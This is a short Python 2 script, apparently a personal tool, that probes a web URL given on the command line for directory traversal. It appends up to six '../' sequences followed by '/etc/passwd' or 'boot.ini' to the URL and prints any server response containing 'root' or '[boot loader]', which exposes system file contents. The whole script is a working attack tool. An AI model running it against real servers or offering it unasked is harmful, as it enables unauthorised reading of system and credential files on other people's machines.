#!/usr/bin/python
# -*- coding: utf-8 -*-
# author: Leandro Batista
# e-mail: leandrobatistapereira98@gmail.com
import requests
import sys

url = sys.argv[1]
cargas = {'/etc/passwd': 'root', 'boot.ini': '[boot loader]'}
subindo = "../"
i = 0

for carga, string in cargas.iteritems():
    for i in xrange(7):
        r = requests.post(url + (i * subindo) + carga)
        if string in r.text:
            print 'Vulneravel:\r\n'
            print 'Ataque string: ' + (i * subindo) + carga + '\r\n'
            print r.text
            break
